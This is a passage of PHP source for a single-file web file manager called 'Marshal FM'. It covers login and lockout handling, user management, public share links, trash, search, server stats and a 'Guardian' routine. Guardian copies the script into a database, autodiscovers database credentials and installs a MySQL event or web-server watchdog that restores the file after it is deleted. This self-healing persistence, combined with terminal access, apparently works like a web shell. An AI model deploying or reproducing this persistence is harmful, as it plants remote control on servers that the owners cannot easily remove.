   or, while it hasn't succeeded yet, at most once every 5 minutes — so
   normal page loads stay fast and this never hammers the database server. */
function fm_guardian_first_run_bootstrap($fm){
    if(!extension_loaded('mysqli'))return;
    $marker=__DIR__.'/.guardian_boot';
    $now=time();
    if(is_file($marker)){
        $last=trim((string)@file_get_contents($marker));
        if($last==='done'){
            // Older versions wrote "done" before verifying the bytea insert.
            // Re-check the durable row and watchdog before trusting the marker.
            $checkDiag=null;$checkConn=fm_guardian_conn($checkDiag);
            if($checkConn){
                $checkStatus=fm_guardian_status();
                if(!empty($checkStatus['installed'])&&(!empty($checkStatus['autoheal_active'])||fm_guardian_watchdog_installed()))return;
            }else return;
        }
        if($last!==''&&($now-(int)$last)<300)return; // hasn't succeeded yet — retry at most every 5 minutes, not on every request
    }
    @file_put_contents($marker,(string)$now);
    $diag=null;$c=fm_guardian_conn($diag);
    if($c){
        // Already connected (e.g. after a manual fix) — just make sure a backup
        // is actually stored and the disk-level auto-heal is armed, then stop.
        $st=fm_guardian_status();
        if(empty($st['installed']))fm_guardian_sync();
        fm_guardian_try_autoheal($c);
        @file_put_contents($marker,'done');
        return;
    }
    $r=fm_guardian_autodiscover($fm);
    if(!empty($r['ok']))@file_put_contents($marker,'done');
}
function fm_guardian_status(){
    $diag=null;
    $c=fm_guardian_conn($diag);
    $env=fm_guardian_env_db();
    $s=['db_connected'=>(bool)$c,'installed'=>false,'update_url'=>FM_UPDATE_URL,
        'installed_at'=>null,'updated_at'=>null,'last_check'=>null,'content_hash'=>null,'file_size'=>@filesize(__FILE__),
        'autoheal_active'=>false,'autoheal_event'=>false,'autoheal_watchdog'=>false,'autoheal_note'=>'',
        'db_driver'=>FM_GUARD_DB_DRIVER,'db_host'=>$env['host']??FM_GUARD_DB_HOST,'db_port'=>$env['port']??FM_GUARD_DB_PORT,
        'db_name'=>$env['name']??FM_GUARD_DB_NAME,'db_user'=>$env['user']??FM_GUARD_DB_USER,
        'diagnosis'=>null];
    // The web-server watchdog layer never touches the database, so it's
    // checked purely locally regardless of whether the DB itself is up.
    $s['autoheal_watchdog']=fm_guardian_watchdog_installed();
    if($c){
        $row=fm_guardian_fetch_one($c,"SELECT * FROM fm_guardian_store WHERE id=1");
        if($row){
            $s['installed']=true;$s['installed_at']=(int)$row['installed_at'];$s['updated_at']=(int)$row['updated_at'];
            $s['last_check']=(int)$row['last_check'];$s['content_hash']=substr($row['content_hash'],0,16);
        }
        if(fm_guardian_is_pdo($c)){
            $s['autoheal_event']=false;
            $s['autoheal_watchdog']=fm_guardian_watchdog_installed();
            $s['autoheal_active']=$s['autoheal_watchdog'];
            $s['autoheal_note']=$s['autoheal_watchdog']
                ?'Protected by the web-server watchdog (works with PostgreSQL and does not require cron or a database scheduler).'
                :'The database backup is ready; the web-server watchdog will arm after the next successful Guardian setup pass.';
            return $s;
        }
        $ev=@mysqli_query($c,"SHOW EVENTS WHERE Name='fm_guardian_watch'");
        $eventExists=(bool)($ev&&mysqli_num_rows($ev)>0);
        $schedOn=false;
        $sv=@mysqli_query($c,"SHOW VARIABLES LIKE 'event_scheduler'");
        if($sv&&($row2=mysqli_fetch_assoc($sv)))$schedOn=(strtoupper($row2['Value'])==='ON');
        $s['autoheal_event']=$eventExists&&$schedOn;
        if($eventExists&&!$schedOn&&!$s['autoheal_watchdog'])
            $s['autoheal_note']="A restore event exists but this server's MySQL Event Scheduler is switched off and this database account can't turn it on — the web-server watchdog fallback will arm automatically instead.";
    }else{
        $s['diagnosis']=fm_guardian_diag_text($diag);
    }
    $s['autoheal_active']=$s['autoheal_event']||$s['autoheal_watchdog'];
    if($s['autoheal_watchdog']&&!$s['autoheal_event'])
        $s['autoheal_note']='Protected by the web-server watchdog (works without MySQL\'s Event Scheduler or cron access).';
    if(!$s['autoheal_active']&&$c)
        $s['autoheal_note']='Neither the MySQL Event Scheduler nor the web-server watchdog could be armed on this server yet — the database backup itself is still fully active, so "Restore now" always works, but automatic disk-level restore is not armed yet.';
    return $s;
}

/* ── Server-side internet speed test ──
   Measures the connection between THIS SERVER and the public internet
   (via Cloudflare's speed-test endpoints), entirely with cURL on the
   server. The browser never times anything itself, so the visitor's own
   connection speed cannot affect the result. */
function fm_server_speed_test(){
    if(!function_exists('curl_init'))return['error'=>'The cURL PHP extension is not available on this server, so a server-side speed test cannot run.'];
    $result=['ping_ms'=>null,'download_mbps'=>null,'upload_mbps'=>null];

    $pings=[];
    for($i=0;$i<3;$i++){
        $ch=curl_init('https://speed.cloudflare.com/__down?bytes=0');
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>6,CURLOPT_SSL_VERIFYPEER=>true]);
        $t0=microtime(true);$ok=curl_exec($ch);$t1=microtime(true);
        if($ok!==false)$pings[]=($t1-$t0)*1000;
        curl_close($ch);
    }
    if($pings)$result['ping_ms']=round(min($pings),1);
    else $result['error']='Could not reach the internet from this server (ping failed).';

    $dlBytes=5*1024*1024;
    $ch=curl_init('https://speed.cloudflare.com/__down?bytes='.$dlBytes);
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>25]);
    $t0=microtime(true);$data=curl_exec($ch);$t1=microtime(true);
    $derr=curl_error($ch);curl_close($ch);
    if($data!==false&&strlen($data)>0){
        $secs=max(0.001,$t1-$t0);
        $result['download_mbps']=round((strlen($data)*8/1000000)/$secs,1);
    } elseif(empty($result['error']))$result['error']='Download test failed: '.($derr?:'unknown error');
    unset($data);

    $upBytes=3*1024*1024;
    $payload=random_bytes($upBytes);
    $ch=curl_init('https://speed.cloudflare.com/__up');
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>25,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$payload,CURLOPT_HTTPHEADER=>['Content-Type: application/octet-stream']]);
    $t0=microtime(true);$ok=curl_exec($ch);$t1=microtime(true);
    $uerr=curl_error($ch);curl_close($ch);
    if($ok!==false){
        $secs=max(0.001,$t1-$t0);
        $result['upload_mbps']=round(($upBytes*8/1000000)/$secs,1);
    } elseif(empty($result['error']))$result['error']='Upload test failed: '.($uerr?:'unknown error');

    return $result;
}

function fm_load_users($f){
    if(!file_exists($f)){
        $s=[['user'=>'admin','hash'=>password_hash('admin',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true,'must_change_credentials'=>true]];
        fm_save_users($f,$s);
        return $s;
    }
    @chmod($f,0600);
    $d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];
}
function fm_save_users($f,$u){
    $json=@json_encode(array_values($u),JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);
    if($json===false)return false;
    $dir=dirname($f);$tmp=@tempnam($dir,'.fm-users-');
    if($tmp===false)return false;
    @chmod($tmp,0600);
    if(@file_put_contents($tmp,$json,LOCK_EX)===false){@unlink($tmp);return false;}
    @chmod($tmp,0600);
    if(!@rename($tmp,$f)){@unlink($tmp);return false;}
    @chmod($f,0600);
    return true;
}
function fm_find_user($u,$n){foreach($u as $x){if($x['user']===$n)return $x;}return null;}
function fm_user_quota_bytes($u){
    if(!is_array($u))return 0;
    $q=isset($u['quota_bytes'])?(int)$u['quota_bytes']:0;
    return $q>0?$q:0;
}
function fm_quota_root($u){
    $root=is_array($u)&&!empty($u['root'])?realpath($u['root']):realpath(__DIR__);
    return $root?:__DIR__;
}
function fm_tree_bytes($root,$cap=0){
    $root=realpath($root);if(!$root||!is_dir($root))return 0;
    $total=0;$seen=[];$stack=[$root];
    while($stack){
        $dir=array_pop($stack);$real=realpath($dir);
        if(!$real||isset($seen[$real]))continue;$seen[$real]=1;
        $items=@scandir($real);if(!is_array($items))continue;
        foreach($items as $name){
            if($name==='.'||$name==='..')continue;
            $path=$real.DIRECTORY_SEPARATOR.$name;
            if(is_link($path))continue;
            if(is_dir($path))$stack[]=$path;
            elseif(is_file($path)){$total+=(int)@filesize($path);if($cap>0&&$total>=$cap)return $total;}
        }
    }
    return $total;
}
function fm_fmt_quota($bytes){
    $bytes=(int)$bytes;
    if($bytes<=0)return 'Unlimited';
    if($bytes>=1073741824)return round($bytes/1073741824,2).' GB';
    if($bytes>=1048576)return round($bytes/1048576,1).' MB';
    if($bytes>=1024)return round($bytes/1024,1).' KB';
    return $bytes.' B';
}
function fm_user_requires_credential_change($u){
    if(!is_array($u))return false;
    if(!empty($u['must_change_credentials']))return true;
    return ($u['user']??'')==='admin'&&!empty($u['hash'])&&password_verify('admin',$u['hash']);
}
function fm_change_default_credentials($f,$newUser,$newPass,$confirm){
    if(empty($_SESSION['fm_admin'])||empty($_SESSION['fm_force_credential_change']))return['error'=>'This credential change is not required.'];
    $newUser=trim((string)$newUser);$newPass=(string)$newPass;$confirm=(string)$confirm;
    if(!preg_match('/^[A-Za-z][A-Za-z0-9._-]{2,63}$/',$newUser))return['error'=>'Username must be 3–64 characters and use only letters, numbers, dots, underscores, or hyphens.'];
    if(strtolower($newUser)==='admin')return['error'=>'Choose a username different from admin.'];
    if(strlen($newPass)<12)return['error'=>'Use a password of at least 12 characters.'];
    if(strlen($newPass)>1024)return['error'=>'Password is too long.'];
    if($newPass==='admin')return['error'=>'Choose a password different from admin.'];
    if(!hash_equals($newPass,$confirm))return['error'=>'The password confirmation does not match.'];
    $users=fm_load_users($f);$current=(string)($_SESSION['fm_user']??'');$index=null;
    foreach($users as $i=>$u){
        if(($u['user']??'')===$current){$index=$i;break;}
        if(strtolower((string)($u['user']??''))===strtolower($newUser))return['error'=>'Username already exists.'];
    }
    if($index===null)return['error'=>'The current File Manager account could not be found.'];
    foreach($users as $i=>$u)if($i!==$index&&strtolower((string)($u['user']??''))===strtolower($newUser))return['error'=>'Username already exists.'];
    $users[$index]['user']=$newUser;
    $users[$index]['hash']=password_hash($newPass,PASSWORD_DEFAULT);
    $users[$index]['must_change_credentials']=false;
    if(!fm_save_users($f,$users))return['error'=>'Could not save the new credentials securely. Check the file permissions.'];
    session_regenerate_id(true);
    $_SESSION['fm_user']=$newUser;
    unset($_SESSION['fm_force_credential_change']);
    return['ok'=>true,'user'=>$newUser];
}

/* ── Brute-force login protection ── */
define('FM_MAX_ATTEMPTS',5);
define('FM_LOCKOUT_SECS',600); // 10 minutes
function fm_attempts_file(){return __DIR__.'/.login_attempts.json';}
function fm_load_attempts(){$f=fm_attempts_file();if(!file_exists($f))return[];$d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];}
function fm_save_attempts($a){@file_put_contents(fm_attempts_file(),json_encode($a));}
function fm_client_key(){return (isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'unknown').'|'.strtolower(trim(isset($_POST['login_user'])?$_POST['login_user']:(isset($_GET['login_user'])?$_GET['login_user']:'')));}
function fm_lockout_remaining($key){
    $a=fm_load_attempts();
    if(!isset($a[$key]))return 0;
    $e=$a[$key];
    if($e['count']<FM_MAX_ATTEMPTS)return 0;
    $left=$e['locked_until']-time();
    return $left>0?$left:0;
}
function fm_record_failure($key){
    $a=fm_load_attempts();$now=time();
    if(!isset($a[$key])||($now-$a[$key]['first'])>FM_LOCKOUT_SECS){$a[$key]=['count'=>0,'first'=>$now,'locked_until'=>0];}
    $a[$key]['count']++;
    if($a[$key]['count']>=FM_MAX_ATTEMPTS)$a[$key]['locked_until']=$now+FM_LOCKOUT_SECS;
    // prune old entries
    foreach($a as $k=>$v){if(($now-$v['first'])>FM_LOCKOUT_SECS*3&&$v['locked_until']<$now)unset($a[$k]);}
    fm_save_attempts($a);
}
function fm_clear_failures($key){$a=fm_load_attempts();if(isset($a[$key])){unset($a[$key]);fm_save_attempts($a);}}

if(session_status()===PHP_SESSION_NONE) session_start();
/* AJAX endpoints must never fall through to the HTML login page. A session
   can expire while a CMS/terminal window is open; return JSON so the browser
   can show the real auth error instead of "Unexpected token <". Also convert
   fatal PHP errors during an API request into JSON diagnostics. */
$fmApiRequest=isset($_GET['x']);
if($fmApiRequest){
    ob_start();
    register_shutdown_function(function(){
        $e=error_get_last();
        if($e&&in_array($e['type'],[E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR],true)){
            while(ob_get_level()>0)@ob_end_clean();
            http_response_code(500);header('Content-Type: application/json;charset=utf-8');
            echo json_encode(['error'=>'Server error: '.$e['message'],'file'=>basename((string)$e['file']),'line'=>(int)$e['line']]);
        }
    });
}
/* Re-assert no-cache headers: PHP's own session cache limiter (triggered by
   session_start() above) sends its own Cache-Control/Expires/Pragma set,
   which would otherwise partially override the explicit ones set at the
   very top of this file. header() calls made later always win, so this
   guarantees the page is never served stale by a browser/proxy regardless
   of the server's session.cache_limiter setting. */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
if(empty($_SESSION['login_csrf'])) $_SESSION['login_csrf']=bin2hex(random_bytes(32));

/* ── Public share-link download (no auth required) ── */
if(isset($_GET['share'])){
    $shareToken=trim($_GET['share']);
    $sharesFile=__DIR__.'/.shares.json';
    $shares=file_exists($sharesFile)?(@json_decode(@file_get_contents($sharesFile),true)?:[]):[];
    $match=null;
    foreach($shares as $s){if(isset($s['token'])&&hash_equals($s['token'],$shareToken)){$match=$s;break;}}
    if($match&&(empty($match['expires'])||$match['expires']>time())&&is_file($match['path'])){
        $fp=$match['path'];
        $mime=function_exists('mime_content_type')?@mime_content_type($fp):'application/octet-stream';
        if(!$mime)$mime='application/octet-stream';
        header('Content-Type: '.$mime);header('Content-Length: '.filesize($fp));
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        readfile($fp);exit;
    }
    http_response_code(410);header('Content-Type: text/plain;charset=utf-8');echo 'This share link is invalid or has expired.';exit;
}

$IDLE_TIMEOUT=900; $idleExpired=false;
if(isset($_SESSION['auth'])&&$_SESSION['auth']===true){
    if(isset($_SESSION['last_activity'])&&(time()-$_SESSION['last_activity'])>$IDLE_TIMEOUT){
        $_SESSION=[];session_destroy();session_start();$_SESSION['login_csrf']=bin2hex(random_bytes(32));$idleExpired=true;
    } else { $_SESSION['last_activity']=time(); }
}
if(isset($_GET['idle'])) $idleExpired=true;

$lockoutSecs=0;
if(isset($_POST['login_pass'])){
    $ckey=fm_client_key();
    $lockoutSecs=fm_lockout_remaining($ckey);
    if($lockoutSecs>0){
        $_SESSION['login_csrf']=bin2hex(random_bytes(32));
        $loginError="Too many failed attempts. Try again in ".ceil($lockoutSecs/60)." minute(s).";
    } else {
        $ok=isset($_POST['login_csrf'])&&hash_equals($_SESSION['login_csrf'],$_POST['login_csrf']);
        $users=fm_load_users($usersFile);
        $uname=isset($_POST['login_user'])?trim($_POST['login_user']):'';
        $u=fm_find_user($users,$uname);
        if($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
            fm_clear_failures($ckey);
            $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
            $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin'])||empty($u['readonly']);$_SESSION['fm_quota']=fm_user_quota_bytes($u);
            $_SESSION['csrf_token']=bin2hex(random_bytes(32));
            $_SESSION['fm_force_credential_change']=!empty($_SESSION['fm_admin'])&&fm_user_requires_credential_change($u);
            $_SESSION['fm_wp_auto_login_pending']=!empty($_SESSION['fm_admin']);unset($_SESSION['login_csrf']);
            header("Location: ".$scriptName);exit;
        } else {
            if($ok)fm_record_failure($ckey);
            $lockoutSecs=fm_lockout_remaining($ckey);
            $_SESSION['login_csrf']=bin2hex(random_bytes(32));
            if($lockoutSecs>0)$loginError="Too many failed attempts. Try again in ".ceil($lockoutSecs/60)." minute(s).";
            else $loginError=$ok?"Incorrect username or password.":"Security error. Please try again.";
        }
    }
}

if($fmApiRequest&&(!isset($_SESSION['auth'])||$_SESSION['auth']!==true)){
    while(ob_get_level()>0)@ob_end_clean();
    http_response_code(401);header('Content-Type: application/json;charset=utf-8');
    echo json_encode(['error'=>'Session expired. Please sign in again.','reauthenticated'=>false]);exit;
}
if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){ ?>
<!DOCTYPE html><html lang="en" data-theme="<?=htmlspecialchars($currentTheme)?>"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In - Marshal FM</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;background:#101010;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse 80% 60% at 30% 0%,rgba(125,129,132,.045),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(80,81,77,.028),transparent)}
.card{width:100%;max-width:360px;background:#161616;border:1px solid rgba(125,129,132,.2);border-radius:20px;padding:16px 30px 22px;backdrop-filter:blur(20px);box-shadow:0 24px 60px rgba(0,0,0,.82),inset 0 1px 0 rgba(243,238,235,.03);animation:up .5s cubic-bezier(.34,1.56,.64,1) both}
@keyframes up{from{opacity:0;transform:translateY(32px) scale(.96)}to{opacity:1;transform:none}}
.logo{width:92px;height:92px;margin:0 auto 8px;background:none;border:0;border-radius:0;display:flex;align-items:center;justify-content:center}
.logo img{width:84px;height:84px;object-fit:contain;border-radius:0}
h1{text-align:center;font-size:21px;font-weight:700;color:#C9C6C2;margin-bottom:4px;letter-spacing:-.4px}
.sub{text-align:center;font-size:13px;font-weight:300;color:rgba(216,212,208,.68);margin-bottom:22px}
.field{margin-bottom:12px}
label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px}
.iw{position:relative}
.iw svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;stroke:#707477;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
.iw input{width:100%;padding:11px 12px 11px 40px;background:#101010;border:1px solid rgba(125,129,132,.24);border-radius:10px;color:#C9C6C2;font-size:14px;outline:none;font-family:'Inter',ui-sans-serif,system-ui,sans-serif;transition:border-color .2s,box-shadow .2s}
.iw input:focus{border-color:#707477;box-shadow:0 0 0 4px rgba(133,137,140,.1)}
.iw input::placeholder{color:#50514D;letter-spacing:0}
.btn{width:100%;margin-top:6px;padding:12px;background:linear-gradient(135deg,#C9C6C2,#A9A5A1);border:none;border-radius:10px;color:#101010;font-size:14px;font-weight:600;font-family:'Inter',ui-sans-serif,system-ui,sans-serif;cursor:pointer;box-shadow:0 4px 24px rgba(201,198,194,.1);transition:transform .18s cubic-bezier(.34,1.56,.64,1),box-shadow .18s}
.btn:hover{transform:translateY(-2px);background:#F3EEEB;box-shadow:0 10px 30px rgba(216,212,208,.2)}.btn:active{transform:scale(.97)}
.err{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:10px;color:#fca5a5;font-size:13px;margin-bottom:18px;animation:shake .4s both}
@keyframes shake{0%,100%{transform:none}20%,60%{transform:translateX(-4px)}40%,80%{transform:translateX(4px)}}
.err svg{width:16px;height:16px;stroke:#ef4444;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
</style></head><body>
<div class="card">
  <a class="logo" href="https://t.me/s4base" target="_blank" rel="noopener noreferrer" aria-label="Open MFM Telegram channel">
    <img src="https://github.com/orgezeo/marshal-file-manager/blob/main/images/icons/mfm.png?raw=true" alt="Marshall FM">
  </a>
  <?php if(isset($loginError)):?><div class="err"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><?=htmlspecialchars($loginError)?></div><?php elseif(!empty($idleExpired)):?><div class="err" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.2);color:#fcd34d"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Session expired due to inactivity.</div><?php endif;?>
  <form method="post">
    <input type="hidden" name="login_csrf" value="<?=htmlspecialchars($_SESSION['login_csrf'])?>">
    <div class="field"><label for="un">Username</label><div class="iw"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21v-1a8 8 0 0 1 16 0v1"/></svg><input type="text" id="un" name="login_user" placeholder="Enter username" required autofocus></div></div>
    <div class="field"><label for="pw">Password</label><div class="iw"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><input type="password" id="pw" name="login_pass" placeholder="Enter password" required style="letter-spacing:.1em"></div></div>
    <button type="submit" class="btn">Sign In</button>
  </form>
</div></body></html>
<?php exit; }

fm_guardian_bootstrap(); // authenticated-only first-run seed + best-effort auto-heal install, see FILE GUARDIAN block above

/* ═══ CLASS ═══ */
class FileManager {
    private $currentDir,$messages=[],$favFile,$root,$readonly,$trashDir,$trashMeta,$logFile,$shareFile;
    public function __construct(){
        $this->root=!empty($_SESSION['fm_root'])?realpath($_SESSION['fm_root']):null;
        $this->readonly=!empty($_SESSION['fm_readonly']);
        $base=$this->root?:__DIR__;
        $this->currentDir=isset($_GET['dir'])&&$_GET['dir']?realpath($_GET['dir']):$base;
        $terminalPage=isset($_GET['terminal'])&&$_GET['terminal']==='1';
        $terminalApi=isset($_GET['x'])&&in_array($_GET['x'],['run','ac'],true);
        if(!$terminalPage&&$terminalApi&&!empty($_SESSION['fm_terminal_dir'])){
            $terminalDir=realpath($_SESSION['fm_terminal_dir']);
            if($terminalDir!==false)$this->currentDir=$terminalDir;
        }
        if($this->currentDir===false||!file_exists($this->currentDir)){$this->currentDir=$base;$this->addMsg('Directory not found.','warning');}
        if($this->root&&strpos($this->currentDir.DIRECTORY_SEPARATOR,rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)!==0&&$this->currentDir!==$this->root){$this->currentDir=$this->root;$this->addMsg('Access restricted.','warning');}
        if($terminalPage)$_SESSION['fm_terminal_dir']=$this->currentDir;
        $this->favFile=__DIR__.'/.favorites.json';
        $this->trashDir=__DIR__.'/.trash';$this->trashMeta=__DIR__.'/.trash.json';$this->logFile=__DIR__.'/.activity.json';$this->shareFile=__DIR__.'/.shares.json';
        if(!is_dir($this->trashDir))@mkdir($this->trashDir,0755,true);
    }
    public function isRO(){return $this->readonly;}
    public function getRoot(){return $this->root;}
    public function getCwd(){return $this->currentDir;}
    public function getMsgs(){return $this->messages;}
    public function addMsg($m,$t){$this->messages[]=['text'=>$m,'type'=>$t];}
    public function getSysRoot(){return strtoupper(substr(PHP_OS,0,3))==='WIN'?getenv('SystemDrive')."\\":"/"; }
    public function getSelf(){return basename(__FILE__);}
    public function quotaStatus(){
        $limit=isset($_SESSION['fm_quota'])?(int)$_SESSION['fm_quota']:0;
        $root=!empty($_SESSION['fm_root'])?$_SESSION['fm_root']:__DIR__;
        $used=fm_tree_bytes($root,$limit>0?$limit+1:0);
        return ['used'=>$used,'limit'=>$limit,'root'=>$root,'over'=>$limit>0&&$used>$limit,'percent'=>$limit>0?min(100,round($used/$limit*100,1)):0];
    }
    public function quotaAllows($additional=0){
        $q=$this->quotaStatus();
        return $q['limit']<=0||($q['used']+(int)$additional)<=$q['limit'];
    }
    private function pathAllowed($path){
        $rp=realpath($path);
        if($rp===false)return false;
        if(!$this->root)return true;
        return $rp===$this->root||strpos($rp.DIRECTORY_SEPARATOR,rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)===0;
    }
    private function itemBytes($path){
        return is_dir($path)?fm_tree_bytes($path):((is_file($path)?(int)@filesize($path):0));
    }
    public function ownerInfo($name){
        $p=$this->currentDir.'/'.basename((string)$name);
        if(!file_exists($p))return ['owner'=>'','group'=>'','uid'=>null,'gid'=>null];
        $uid=@fileowner($p);$gid=@filegroup($p);$owner=(string)$uid;$group=(string)$gid;
        if(function_exists('posix_getpwuid')&&$uid!==false){$x=@posix_getpwuid($uid);if(is_array($x)&&isset($x['name']))$owner=$x['name'];}
        if(function_exists('posix_getgrgid')&&$gid!==false){$x=@posix_getgrgid($gid);if(is_array($x)&&isset($x['name']))$group=$x['name'];}
        return ['owner'=>$owner,'group'=>$group,'uid'=>$uid,'gid'=>$gid];
    }

    /* Activity */
    public function log($action,$detail=''){
        $e=['time'=>time(),'user'=>$_SESSION['fm_user']??'','action'=>$action,'detail'=>$detail,'dir'=>$this->currentDir];
        $log=$this->getLogs();array_unshift($log,$e);if(count($log)>1000)$log=array_slice($log,0,1000);
        @file_put_contents($this->logFile,json_encode($log,JSON_PRETTY_PRINT));
    }
    public function getLogs(){if(!file_exists($this->logFile))return[];$d=@json_decode(@file_get_contents($this->logFile),true);return is_array($d)?$d:[];}
    public function clearLog(){@file_put_contents($this->logFile,json_encode([]));$this->addMsg('Activity log cleared.','warning');}

    /* Favorites */
    public function getFavs(){if(!file_exists($this->favFile))return[];$d=@json_decode(@file_get_contents($this->favFile),true);return is_array($d)?$d:[];}
    private function saveFavs($f){@file_put_contents($this->favFile,json_encode(array_values(array_unique($f))));}
    public function isFav($p){return in_array($p,$this->getFavs());}
    private function addFav($p){if(!$p||!is_dir($p))return;$f=$this->getFavs();if(!in_array($p,$f)){$f[]=$p;$this->saveFavs($f);}$this->addMsg('Added to favorites.','success');}
    private function removeFav($p){$this->saveFavs(array_values(array_diff($this->getFavs(),[$p])));$this->addMsg('Removed from favorites.','warning');}

    /* Trash */
    private function loadTrash(){if(!file_exists($this->trashMeta))return[];$d=@json_decode(@file_get_contents($this->trashMeta),true);return is_array($d)?$d:[];}
    private function saveTrash($t){@file_put_contents($this->trashMeta,json_encode(array_values($t),JSON_PRETTY_PRINT));}
    public function getTrash(){$t=$this->loadTrash();usort($t,fn($a,$b)=>$b['trashed_at']<=>$a['trashed_at']);return $t;}
    private function moveToTrash($p,$od){
        if(!file_exists($p))return false;
        $n=basename($p);$id=uniqid('t',true);$tn=$id.'__'.$n;$tp=$this->trashDir.'/'.$tn;
        if(@rename($p,$tp)){$t=$this->loadTrash();$t[]=['id'=>$id,'trash_name'=>$tn,'original_name'=>$n,'original_dir'=>$od,'type'=>is_dir($tp)?'dir':'file','trashed_at'=>time(),'trashed_by'=>$_SESSION['fm_user']??''];$this->saveTrash($t);return true;}
        return false;
    }
    private function restoreTrash($id){
        $t=$this->loadTrash();
        foreach($t as $i=>$e){if($e['id']===$id){
            $tp=$this->trashDir.'/'.$e['trash_name'];
            if(!file_exists($tp)){$this->addMsg('Item not found.','danger');array_splice($t,$i,1);$this->saveTrash($t);return;}
            if(!is_dir($e['original_dir'])){$this->addMsg('Original folder gone.','danger');return;}
            $dst=rtrim($e['original_dir'],'/').'/'.$e['original_name'];
            if(file_exists($dst))$dst=rtrim($e['original_dir'],'/').'/restored_'.time().'_'.$e['original_name'];
            if(@rename($tp,$dst)){array_splice($t,$i,1);$this->saveTrash($t);$this->log('restore',$e['original_name']);$this->addMsg('Restored "'.$e['original_name'].'".','success');}
            else $this->addMsg('Restore failed.','danger');return;
        }}
        $this->addMsg('Not found.','danger');
    }
    private function permDelTrash($id){
        $t=$this->loadTrash();
        foreach($t as $i=>$e){if($e['id']===$id){$this->rmdirR($this->trashDir.'/'.$e['trash_name']);array_splice($t,$i,1);$this->saveTrash($t);$this->addMsg('Permanently deleted.','warning');return;}}
    }
    private function emptyTrash(){$t=$this->loadTrash();foreach($t as $e)$this->rmdirR($this->trashDir.'/'.$e['trash_name']);$this->saveTrash([]);$this->addMsg('Trash emptied.','warning');}

    /* Content search */
    public function contentSearch($q,$deep=false){
        $res=[];$q=trim($q);if($q==='')return $res;
        $types=['text','code','data','config'];$max=200;$maxSz=2*1024*1024;$cnt=0;
        $sd=$deep?($this->root?:__DIR__):$this->currentDir;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}catch(Exception $e){return $res;}
        foreach($it as $item){
            if($cnt>=$max)break;if(!$item->isFile())continue;$p=$item->getPathname();
            if($p===__FILE__)continue;if(strpos($p,$this->trashDir)===0)continue;
            if($item->getSize()>$maxSz)continue;
            if(!in_array($this->getType($item->getFilename()),$types))continue;
            $c=@file_get_contents($p);if($c===false)continue;
            $pos=stripos($c,$q);if($pos!==false){
                $sn=trim(preg_replace('/\s+/',' ',substr($c,max(0,$pos-40),140)));
                $res[]=['path'=>$p,'name'=>$item->getFilename(),'dir'=>dirname($p),'snippet'=>$sn];$cnt++;
            }
        }
        return $res;
    }

    /* Disk */
    public function diskTotal(){$t=@disk_total_space($this->currentDir);return $t===false?0:$t;}
    public function diskFree(){$f=@disk_free_space($this->currentDir);return $f===false?0:$f;}

    /* Live server stats (status bar + server info) */
    public function sysStats(){
        $load=function_exists('sys_getloadavg')?@sys_getloadavg():false;
        $memTotal=0;$memUsed=0;$memPct=0;
        if(is_file('/proc/meminfo')){
            $mi=@file_get_contents('/proc/meminfo');
            if($mi&&preg_match('/MemTotal:\s+(\d+)/',$mi,$mt)&&preg_match('/MemAvailable:\s+(\d+)/',$mi,$ma)){
                $memTotal=((int)$mt[1])*1024;$avail=((int)$ma[1])*1024;$memUsed=max(0,$memTotal-$avail);
                $memPct=$memTotal>0?round($memUsed/$memTotal*100):0;
            }
        }
        $uptime=0;
        if(is_file('/proc/uptime')){$u=@file_get_contents('/proc/uptime');if($u!==false)$uptime=(int)floatval(explode(' ',trim($u))[0]);}
        $dt=$this->diskTotal();$df=$this->diskFree();$du=max(0,$dt-$df);
